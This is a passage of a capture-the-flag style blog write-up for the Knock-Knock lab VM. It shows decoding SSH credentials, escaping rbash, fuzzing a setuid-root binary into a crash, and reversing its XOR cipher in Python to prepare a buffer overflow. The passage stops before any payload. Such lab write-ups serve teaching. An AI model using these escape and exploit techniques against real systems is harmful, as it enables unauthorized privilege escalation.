&lt;p&gt;sax2Cw9Ow decodes to &lt;strong&gt;fnk2Pj9Bj&lt;/strong&gt;. Is this one also reversed? After a number of attempts and variations, it turns out that the user name is &lt;strong&gt;jason&lt;/strong&gt; (without the cap &lt;em&gt;J&lt;/em&gt;) and the password is &lt;strong&gt;fnk2Pj9Bj&lt;/strong&gt; (jB9jP2knf reversed.) To get the strings in their correct values, we can use the following 2 one liners to get them:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# username
root@kali:~# python -c &#39;print &amp;quot;abfnW&amp;quot;.decode(&amp;quot;rot13&amp;quot;)[::-1].lower()&#39;
jason

# password
root@kali:~# python -c &#39;print &amp;quot;sax2Cw9Ow&amp;quot;.decode(&amp;quot;rot13&amp;quot;)[::-1]&#39;
jB9jP2knf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So to get our first shell:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/knock-knock# ssh jason@192.168.56.203
jason@192.168.56.203&#39;s password:

Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Oct  6 12:33:37 2014 from 192.168.56.202
jason@knockknock:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;no-rbash-just-no&#34;&gt;no rbash, just no&lt;/h2&gt;

&lt;p&gt;Upon first login, I pressed TAB out of pure habit and was immediately presented with the following:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ -rbash: /dev/null: restricted: cannot redirect output
-rbash: /dev/null: restricted: cannot redirect output
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Rbash? Oh well thats ok. I checked by inspecting the env var for &lt;code&gt;SHELL&lt;/code&gt; which was &lt;code&gt;/bin/rbash&lt;/code&gt; just to confirm. Thanks to having recently met a similar situation during the &lt;a href=&#34;https://leonjza.github.io/blog/2014/09/18/from-persistence/&#34;&gt;Persistence&lt;/a&gt; boot2root and learning new ways of breaking out of &lt;code&gt;rbash&lt;/code&gt;, I just typed &lt;code&gt;nice /bin/bash&lt;/code&gt;, which runs a program, supposedly modifying its priority. In this case we care little about the priority. :) We now have a full &lt;code&gt;bash&lt;/code&gt; shell.&lt;/p&gt;

&lt;h2 id=&#34;tiny-file-crypter&#34;&gt;tiny file crypter&lt;/h2&gt;

&lt;p&gt;Some quick initial enumeration did not reveal anything particularly interesting. In &lt;code&gt;jason&lt;/code&gt;&amp;rsquo;s home folder though was a file called &lt;code&gt;tfc&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ ls -lah
total 32K
drwxr-xr-x 2 jason jason 4.0K Oct 11 18:51 .
drwxr-xr-x 3 root  root  4.0K Sep 24 21:03 ..
lrwxrwxrwx 1 jason jason    9 Sep 26 09:50 .bash_history -&amp;gt; /dev/null
-rw-r--r-- 1 jason jason  220 Sep 24 21:03 .bash_logout
-rw-r--r-- 1 jason jason 3.4K Sep 25 21:58 .bashrc
-rw-r--r-- 1 jason jason  675 Sep 24 21:03 .profile
-rwsr-xr-x 1 root  jason 7.3K Oct 11 18:35 tfc
-rw------- 1 jason jason 2.4K Oct 11 18:42 .viminfo

jason@knockknock:~$ ./tfc
_______________________________
\__    ___/\_   _____/\_   ___ \
  |    |    |    __)  /    \  \/
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/

    Tiny File Crypter - 1.0

Usage: ./tfc &amp;lt;filein.tfc&amp;gt; &amp;lt;fileout.tfc&amp;gt;
jason@knockknock:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;Tiny File Crypter&lt;/em&gt; appeared to take a input file and encrypt it. Fair enough. The file is owned by root with the &lt;code&gt;setuid&lt;/code&gt; bit set, strongly suggesting that if we are able to exploit this binary somehow, we may be able to get root.&lt;/p&gt;

&lt;p&gt;Some important observations about &lt;code&gt;tfc&lt;/code&gt; during the first bits of testing; Input and output files must have the &lt;code&gt;.tfc&lt;/code&gt; extension. &lt;code&gt;tfc&lt;/code&gt; does not allow for symlinks as input and or output files. Lastly, the input and output file has to be set and accessible by &lt;code&gt;tfc&lt;/code&gt;. Considering its run as root, that probably wont be a problem.&lt;/p&gt;

&lt;p&gt;A sample encryption run can be seen as:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# we have a source document
jason@knockknock:~$ cat test.tfc
This is a test document.

# we run the encryption program over it
jason@knockknock:~$ ./tfc test.tfc crypt.tfc
&amp;gt;&amp;gt; File crypted, goodbye!

# dump the encrypted file as hex. from the ascii we
# can see its no longer human readable
jason@knockknock:~$ xxd crypt.tfc
0000000: cbd9 7399 3cdf 9922 26f1 cb40 5e85 6a6d  ..s.&amp;lt;..&amp;quot;&amp;amp;..@^.jm
0000010: 07a4 7543 5048 ea33 6a                   ..uCPH.3j

# the resulting file is owned by root
jason@knockknock:~$ ls -l crypt.tfc
-rw-r--r-- 1 root jason 25 Oct 14 08:12 crypt.tfc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, there is one very important finding. We can reverse the encrypted file by simply running it through &lt;code&gt;tfc&lt;/code&gt; again:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ ./tfc crypt.tfc reversed.tfc
&amp;gt;&amp;gt; File crypted, goodbye!

jason@knockknock:~$ cat reversed.tfc
This is a test document.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After finding this, quite a few ideas pop into ones head. Most notably, the fact that the encryption is reversible by using the same tool, suggests it is &lt;a href=&#34;http://en.wikipedia.org/wiki/Symmetric-key_algorithm&#34;&gt;symmetric&lt;/a&gt; using the same key for encryption and decryption.&lt;/p&gt;

&lt;p&gt;But ok. That actually means nothing now. It also definitely does not tell us how to break &lt;code&gt;tfc&lt;/code&gt; either!&lt;/p&gt;

&lt;h2 id=&#34;fuzzing-disassembling-tfc&#34;&gt;fuzzing &amp;amp; disassembling tfc&lt;/h2&gt;

&lt;p&gt;With all of the information gathered thus far about &lt;code&gt;tfc&lt;/code&gt;, I tried a few more tricks to get it to override files in arb places and or read arb files. The extension requirement and symlink checks basically foiled all of my attempts. In summary, I wanted to try and override &lt;code&gt;/etc/shadow&lt;/code&gt; to replace &lt;code&gt;root&lt;/code&gt;s password, or replace &lt;code&gt;/root/.ssh/authorized_keys&lt;/code&gt; with one of my own, but the checks prevented all of that. The best I could get was that I could write files anywhere, but they would always have the &lt;code&gt;.tfc&lt;/code&gt; extension.&lt;/p&gt;

&lt;p&gt;By now it became very apparent that we have to bring &lt;code&gt;tfc&lt;/code&gt; under the microscope and have a closer look at what is happening inside. The first step was to run &lt;code&gt;tfc&lt;/code&gt; through &lt;code&gt;strings&lt;/code&gt; and check the output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ strings tfc
/lib/ld-linux.so.2

[... snip ...]

[^_]
    Tiny File Crypter - 1.0
Usage: ./tfc &amp;lt;filein.tfc&amp;gt; &amp;lt;fileout.tfc&amp;gt;
&amp;gt;&amp;gt; Filenames need a .tfc extension
&amp;gt;&amp;gt; No symbolic links!
&amp;gt;&amp;gt; Failed to open input file
&amp;gt;&amp;gt; Failed to create the output file
&amp;gt;&amp;gt; File crypted, goodbye!
;*2$&amp;quot;
_______________________________
\__    ___/\_   _____/\_   ___ \
  |    |    |    __)  /    \  \/
  |    |    |     \   \     \____
  |____|    \___  /    \______  /
                \/            \/
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, quite literally nothing useful. The only familiar thing here was the error messages that I have seen while testing initially :D&lt;/p&gt;

&lt;p&gt;I figured I needed to get &lt;code&gt;tfc&lt;/code&gt; into &lt;code&gt;gdb&lt;/code&gt; and inspect it further there, however this VM did not have &lt;code&gt;gdb&lt;/code&gt; installed. So, I copied it off the VM onto my Kali Linux install and plugged it into &lt;code&gt;gdb&lt;/code&gt;. Then, to get an idea of what its doing, I started to disassemble it, starting with &lt;code&gt;main&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.
gdb-peda$ disass main
Dump of assembler code for function main:
   0x08048924 &amp;lt;+0&amp;gt;: push   ebp
   0x08048925 &amp;lt;+1&amp;gt;: mov    ebp,esp

   [... snip ...]

   0x0804894e &amp;lt;+42&amp;gt;:    mov    DWORD PTR [esp],eax
   0x08048951 &amp;lt;+45&amp;gt;:    call   0x80486e6 &amp;lt;cryptFile&amp;gt;    #&amp;lt;---
   0x08048956 &amp;lt;+50&amp;gt;:    test   eax,eax

   [... snip ...]

   0x0804896c &amp;lt;+72&amp;gt;:    ret
End of assembler dump.
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After some initial setup work and argument checks we notice a call to a function called &lt;code&gt;cryptFile&lt;/code&gt;. So the next logical step was to check what happening in that function:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ disass cryptFile
Dump of assembler code for function cryptFile:
   0x080486e6 &amp;lt;+0&amp;gt;: push   ebp
   0x080486e7 &amp;lt;+1&amp;gt;: mov    ebp,esp
   0x080486e9 &amp;lt;+3&amp;gt;: sub    esp,0x1088

   [... snip ...]

   0x080488a8 &amp;lt;+450&amp;gt;:   mov    DWORD PTR [esp],eax
   0x080488ab &amp;lt;+453&amp;gt;:   call   0x8048618 &amp;lt;xcrypt&amp;gt;       #&amp;lt;---
   0x080488b0 &amp;lt;+458&amp;gt;:   mov    eax,DWORD PTR [ebp-0x14]

   [... snip ...]

   0x08048922 &amp;lt;+572&amp;gt;:   leave
   0x08048923 &amp;lt;+573&amp;gt;:   ret
End of assembler dump.
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;crytFile&lt;/code&gt; does some internal &lt;em&gt;things&lt;/em&gt; (like &lt;code&gt;call   0x80484a0 &amp;lt;open@plt&amp;gt;&lt;/code&gt; opening the file?) and eventually calls a function &lt;code&gt;xcrypt&lt;/code&gt;. So, what are we gonna do? Disassemble it ofc! :) Inspecting it it seemed that this may be the actual heart of the encryption logic based on the bunch of &lt;code&gt;xor&lt;/code&gt; calls it had. Of course, this is only a guess and I may have missed something else completely.&lt;/p&gt;

&lt;p&gt;I also checked out the security features this binary was compiled with:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : disabled
PIE       : disabled
RELRO     : disabled
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Woa. &lt;strong&gt;No&lt;/strong&gt; security? Ok&amp;hellip;&lt;/p&gt;

&lt;h2 id=&#34;we-knocked-and-tfc-opened-the-door-to-bof&#34;&gt;we knocked and tfc opened the door to bof&lt;/h2&gt;

&lt;p&gt;The disassembly of &lt;code&gt;tfc&lt;/code&gt; did not exactly point out any specific failures immediately either. Mainly due to my complete noobness. :)&lt;/p&gt;

&lt;p&gt;So, I had the idea to check how it handles large files. And by large I mean to gradually increase the size of the file to be encrypted, starting with like 2MB. So I started to test this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# create a file of roughly 2MB
root@kali:~# dd if=/dev/urandom of=large.tfc bs=1M count=2
2+0 records in
2+0 records out
2097152 bytes (2.1 MB) copied, 0.132812 s, 15.8 MB/s

# confirm the size of the file
root@kali:~# ls -lh large.tfc
-rw-r--r-- 1 root root 2.0M Oct 14 15:01 large.tfc

# check how many characters we have in the file
root@kali:~# wc -c large.tfc
2097152 large.tfc

# attempt encryption
root@kali:~# ./tfc large.tfc out.tfc
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;em&gt;Segmentation fault&lt;/em&gt;! Being able to crash &lt;code&gt;tfc&lt;/code&gt; is really good news. I went on to test just how many characters were needed to crash &lt;code&gt;tfc&lt;/code&gt; in a easily reproducible way, and it came down to something like 6000 characters were doing the job just fine. So, it was time to inspect this crash in &lt;code&gt;gdb&lt;/code&gt;. I first prepared a new file with just &amp;ldquo;A&amp;rdquo; in it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# echo -n $(python -c &#39;print &amp;quot;A&amp;quot;*6000&#39;) &amp;gt; gdb-test.tfc
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;And continued to run it in &lt;code&gt;gdb&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.
gdb-peda$ r gdb-test.tfc gdb-test-out.tfc

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fbfff4 --&amp;gt; 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&#39;\t&#39;)
ESI: 0x0
EDI: 0x0
EBP: 0xc55193b
ESP: 0xbffff3c0 (&amp;quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&amp;quot;...)
EIP: 0x675c916
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x675c916
[------------------------------------stack-------------------------------------]
0000| 0xbffff3c0 (&amp;quot;_dv(\002\250C^zƜ=\214`P@JH\\/Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o&amp;quot;...)
0004| 0xbffff3c4 --&amp;gt; 0x5e43a802
0008| 0xbffff3c8 --&amp;gt; 0x3d9cc67a
0012| 0xbffff3cc --&amp;gt; 0x4050608c
0016| 0xbffff3d0 (&amp;quot;JH\\/Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&amp;quot;l\311+\203˃&amp;amp;\322t\217 &amp;quot;...)
0020| 0xbffff3d4 (&amp;quot;Ux7;&amp;lt;\243\211T*U\227\071\017:\236\026L\021\267\b\265\275ktJj\323\024w\367\f;\031\372\065u_˰&#39;\255nL^F\275\351D;\251\376~\246b\a\006Wҩ&amp;gt;\001\330Zn\242T\273wO\245uK\251\364?&amp;gt;\362\005$1\016k\371\035\&amp;quot;\030}x\367\177\320&amp;amp;e:\202\030)\316\337/&amp;lt;\371\237\\pC\237\071+)\215JLN,f\352&amp;amp;\005t\362\272\254M\261\343\205\035:O\027a\177\345\331v\276\200wEjR\372nrY\034 \246OBpz\227\337&amp;gt;\335#S@&amp;amp;tW\t\265\236\fSi\r\364\024\205\334qj|\250\270o[jy\017\&amp;quot;l\311+\203˃&amp;amp;\322t\217 BG\202\006&amp;quot;...)
0024| 0xbffff3d8 --&amp;gt; 0x5489a33c
0028| 0xbffff3dc --&amp;gt; 0x3997552a
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0675c916 in ?? ()
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ow. Ok, so we don&amp;rsquo;t crash with a clean &lt;em&gt;0x41414141&lt;/em&gt; as one would have hoped for :( In fact, examining the stack as can be seen above, its just a bunch of crap. The encrypted file content maybe? That would be the only logical conclusion at this stage.&lt;/p&gt;

&lt;h2 id=&#34;planning-a-exploit&#34;&gt;planning a exploit&lt;/h2&gt;

&lt;p&gt;So far I had what I suspected was a stack overflow, however, I suspected the overflow only occurs &lt;strong&gt;after&lt;/strong&gt; the encryption function (remember &lt;code&gt;xcrypt&lt;/code&gt;?) has run and wants to write the output to file (this is an assumption though).&lt;/p&gt;

&lt;p&gt;Ok. So. Make sure you focus now :)&lt;/p&gt;

&lt;p&gt;We have already seen earlier that if we try to re-encrypt an already encrypted file, it actually decrypts it. That means, all things considered, if we were to pass a encrypted version of our &lt;em&gt;A&lt;/em&gt; buffer, we may be able to have EIP overwritten with our own values. There is one major problem with this though. We are unable to write a encrypted version of our &lt;em&gt;A&lt;/em&gt; buffer as we have just observed it crash before the output is written.&lt;/p&gt;

&lt;p&gt;So what does this leave us with? If we can reproduce the encryption logic in a way that we can actually write an encrypted version of our &lt;em&gt;A&lt;/em&gt; buffer long enough, then we can feed that to &lt;code&gt;tfc&lt;/code&gt; and hopefully have workable values. This way we may potentially be able to determine where EIP gets corrupt, and considering &lt;code&gt;tfc&lt;/code&gt; had no security as part of the compilation, maybe execute some shell code on the stack.&lt;/p&gt;

&lt;p&gt;Ok, so, we have a plan, but this involves reverse engineering of the encryption logic in &lt;code&gt;xcrypt()&lt;/code&gt; to get started. Something I have practically 0 experience in.&lt;/p&gt;

&lt;h2 id=&#34;reversing-xcrypt&#34;&gt;reversing xcrypt()&lt;/h2&gt;

&lt;p&gt;&lt;em&gt;For this part, I have to give a &lt;strong&gt;big&lt;/strong&gt; high five to &lt;a href=&#34;https://twitter.com/recrudesce&#34;&gt;@recrudesce&lt;/a&gt; for helping me understand parts of the pseudo code.&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Right. Essentially, in order for us to better understand what exactly is happening within &lt;code&gt;xcrypt()&lt;/code&gt;, we would ideally want to get some pseudo code generated from the asm. Decompiling wont give you exactly the sources for the function (and in many cases its &lt;em&gt;reaaaaaly&lt;/em&gt; hard to comprehend), but it &lt;em&gt;really&lt;/em&gt; helps in getting the mind to understand the flow.&lt;/p&gt;

&lt;p&gt;For the pseudo code, I downloaded a demo version of &lt;a href=&#34;http://www.hopperapp.com/&#34;&gt;Hopper&lt;/a&gt;. The demo has a boat load of restrictions, including a 30min session limit, however it allows the pseudo code generation, so it was fine for this use. I fired up Hopper, loaded &lt;code&gt;tfc&lt;/code&gt;, located the &lt;code&gt;xcrypt()&lt;/code&gt; function and slapped the Pseudo code generation button:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_hopper_pseudo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;While looking around for pseudo code generation options, I came across the &lt;a href=&#34;http://decompiler.fit.vutbr.cz/decompilation/&#34;&gt;Retargetable Decompiler&lt;/a&gt; online service, which had the following image as a control flow graph for the calls in &lt;code&gt;xcrypt()&lt;/code&gt;.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_crypter_control_flow.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Armed this this graph and the pseudo code, I was ready to start writing a python version of it.&lt;/p&gt;

&lt;p&gt;I started by getting a basic skeleton going for the script and working though the pseudo code line by line. Lets work through it and see what it does exactly.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;int xcrypt(int arg0, int arg1) {
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We start by declaring the fuction &lt;code&gt;xcrypt()&lt;/code&gt;. &lt;code&gt;xcrypt()&lt;/code&gt; takes 2 arguments. From inspecting the the parent function &lt;code&gt;cryptFile()&lt;/code&gt; that calls &lt;code&gt;xcrypt()&lt;/code&gt;, we can see the 2 arguments passed to &lt;code&gt;xcrypt()&lt;/code&gt; is the file content and the length of the content respectively. So, &lt;code&gt;arg0&lt;/code&gt; is the content and &lt;code&gt;arg1&lt;/code&gt; is the content length.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    var_C = 0xea1ab19f;
    var_10 = arg_0;
    var_4 = 0x0;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Here we have 3 variable assignments occur. &lt;code&gt;var_C&lt;/code&gt; is set to &lt;code&gt;0xea1ab19f&lt;/code&gt;, &lt;code&gt;var_10&lt;/code&gt; is set to the file content from &lt;code&gt;arg0&lt;/code&gt; and &lt;code&gt;var_4&lt;/code&gt; is set to 0.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;    while (arg_4 &amp;gt;&amp;gt; 0x2 &amp;gt; var_4) {
            *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This part has one bit that may be very confusing. Comparing this to other output from say IDA and &lt;a href=&#34;http://decompiler.fit.vutbr.cz/decompilation/&#34;&gt;Retargetable Decompiler&lt;/a&gt;, we will see that the &lt;code&gt;arg_4&lt;/code&gt; referred to here is actually the length of the content, so &lt;code&gt;arg1&lt;/code&gt; then.&lt;/p&gt;

&lt;p&gt;With that out the way, we see the start of a while loop for &lt;code&gt;arg_4 &amp;gt;&amp;gt; 0x2&lt;/code&gt;, which translates to &lt;code&gt;len(content) &amp;gt;&amp;gt; 2&lt;/code&gt;, which essentially just means &lt;code&gt;len(content) / 4&lt;/code&gt;. While the output of this bitwise right shift is larger than &lt;code&gt;var_4&lt;/code&gt;, which is 0 at the start, the loop will continue.&lt;/p&gt;

&lt;p&gt;Once inside the loop (and this is the part that for me was the hardest!!!) we see the line &lt;code&gt;*(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;&lt;/code&gt;. What helped me understand what is going on here was to understand that &lt;code&gt;var_10&lt;/code&gt; (which is the content of our file) is being passed by reference. So, &lt;code&gt;var_4 * 4&lt;/code&gt; is essentially &lt;code&gt;i*4&lt;/code&gt; of the contents, or &lt;code&gt;content[i*4]&lt;/code&gt; in python, which is the 4 bytes from &lt;code&gt;var_4&lt;/code&gt;. These 4 bytes are being xored by &lt;code&gt;var_C&lt;/code&gt;, replacing the original 4 bytes in &lt;code&gt;var_10&lt;/code&gt;, to the new xored ones.&lt;/p&gt;

&lt;p&gt;So what can we deduce then? The hardcoded base encryption key for &lt;code&gt;tfc&lt;/code&gt; is &lt;code&gt;0xea1ab19f&lt;/code&gt;. Cool eh! But ok lets move on.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;var_8 = 0x0;
while (var_8 &amp;lt;= 0x7) {
        if ((var_C &amp;amp; 0x1) != 0x0) {
                var_C = var_C &amp;gt;&amp;gt; 0x1;
                var_C = var_C ^ 0x6daa1cf4;
        }
        else {
                var_C = var_C &amp;gt;&amp;gt; 0x1;
        }
        var_8 = var_8 + 0x1;
}
var_4 = var_4 + 0x1;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we see the start of another loop. Remember we are still in the parent loop that is going for the length of the content. This loop is planning on passing 8 times judging from &lt;code&gt;while (0x0 &amp;lt;= 0x7) {&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Once the loop has started, we see a bitwise &lt;code&gt;and&lt;/code&gt; occur that checks if the key (&lt;code&gt;var_C&lt;/code&gt;) &amp;amp; 1 does not equal 0. If it does, it does a bitwise right shift and then xors it with &lt;code&gt;0x6daa1cf4&lt;/code&gt;. Why &lt;code&gt;0x6daa1cf4&lt;/code&gt;? Well, should the key ever become &lt;code&gt;1111 1111 1111 1111&lt;/code&gt; (in binary), then any bitshifts will have no effect. If the &lt;code&gt;and&lt;/code&gt; does not result in 0, just shift the bits.&lt;/p&gt;

&lt;p&gt;This occurs for 8 runs.&lt;/p&gt;

&lt;p&gt;So lets sum that up. The key is permutated 8 times via bitshifts for every 4 bytes of content that gets encrypted.&lt;/p&gt;

&lt;p&gt;Up to here, I had my python script pretty much nailed as I was able to replicate the encryption as is, and confirmed that decrypting it worked fine. However, if the content length was not exactly divisible by 4, the trailing bits of the content would be mangled.&lt;/p&gt;

&lt;p&gt;That brings us to the final part. Rumor has it that this is the padding that occurs. Why this is at the end of the encryption logic (confirmed via multiple pseudo code generators) I don&amp;rsquo;t know :( Maybe someone else can explain this :D I just ignored it :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-c&#34;&gt;var_14 = arg_4 &amp;amp; 0xfffffffc;
var_4 = 0x0;
while ((arg_4 &amp;amp; 0x3) &amp;gt; var_4) {
        *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp;amp; 0xff);
        var_C = var_C &amp;gt;&amp;gt; 0x8;
        var_4 = var_4 + 0x1;
}
return 0x0;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;the-encryption-logic-replicated&#34;&gt;the encryption logic replicated&lt;/h2&gt;

&lt;p&gt;While I was working through the pseudo code, I was writing the python script. You will notice it replicates the pseudo code logic almost exactly, except for the fact that we are not passing the content by reference, but instead build a new string with the encrypted version of the content in it. The script resulted in:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/python

import struct

# Hopper Pseudo Code

# int xcrypt(int arg0, int arg1) {
#     var_C = 0xea1ab19f;
#     var_10 = arg_0;
#     var_4 = 0x0;
#     while (arg_4 &amp;gt;&amp;gt; 0x2 &amp;gt; var_4) {
#             *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;
#             var_8 = 0x0;
#             while (var_8 &amp;lt;= 0x7) {
#                     if ((var_C &amp;amp; 0x1) != 0x0) {
#                             var_C = var_C &amp;gt;&amp;gt; 0x1;
#                             var_C = var_C ^ 0x6daa1cf4;
#                     }
#                     else {
#                             var_C = var_C &amp;gt;&amp;gt; 0x1;
#                     }
#                     var_8 = var_8 + 0x1;
#             }
#             var_4 = var_4 + 0x1;
#     }
#     var_14 = arg_4 &amp;amp; 0xfffffffc;
#     var_4 = 0x0;
#     while ((arg_4 &amp;amp; 0x3) &amp;gt; var_4) {
#             *(int8_t *)(arg_0 + var_14 + var_4) = LOBYTE(var_C ^ *(int8_t *)(arg_0 + var_14 + var_4) &amp;amp; 0xff);
#             var_C = var_C &amp;gt;&amp;gt; 0x8;
#             var_4 = var_4 + 0x1;
#     }
#     return 0x0;
# }

def xcrypt(content, length):

    encrypted = &#39;&#39;

    # set the base encryption key. this mutates with each pass
    key = 0xea1ab19f    # var_C = 0xea1ab19f;

    for word in range(length &amp;gt;&amp;gt; 2): # while (arg_4 &amp;gt;&amp;gt; 0x2 &amp;gt; var_4) {
        # apply the encryption logic as can bee seen in
        # *(var_4 * 0x4 + var_10) = *(var_10 + var_4 * 0x4) ^ var_C;

        # grab the 4 bytes we working with
        bytes = content[word*4:((word*4)+4)]

        # struct unpack_from returns a tuple, we want 0 so that
        # we end up with something we can xor
        long_to_xor = struct.unpack_from(&#39;&amp;lt;L&#39;, bytes)[0]

        # apply the xor, this is the actual encryption part
        encrypted_bytes = long_to_xor ^ key

        # append the 4 encrypted bytes by packing them
        encrypted += struct.pack(&#39;&amp;lt;L&#39;,encrypted_bytes)

        # next we run the key mutation
        for mutation in xrange(8):

            # no mutation is possible of the key is 1111 1111 1111 1111
            if (key &amp;amp; 1) != 0:
                key = key &amp;gt;&amp;gt; 1
                key = key ^ 0x6daa1cf4
            else:
                key = key &amp;gt;&amp;gt; 1

    return encrypted;

if __name__ == &#39;__main__&#39;:

    # set the content that we want to encrypt
    content = &amp;quot;A&amp;quot; *1000
    length = len(content)

    encrypted = xcrypt(content, length)
    print encrypted

&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;testing-the-script&#34;&gt;testing the script&lt;/h2&gt;

&lt;p&gt;With the script done I obviously had to test it. I have a buffer of 1000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s as the content and redirected the script output to a file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python make-crypt.py &amp;gt; test.tfc

root@kali:~# head test.tfc
��[�]��C��dl�
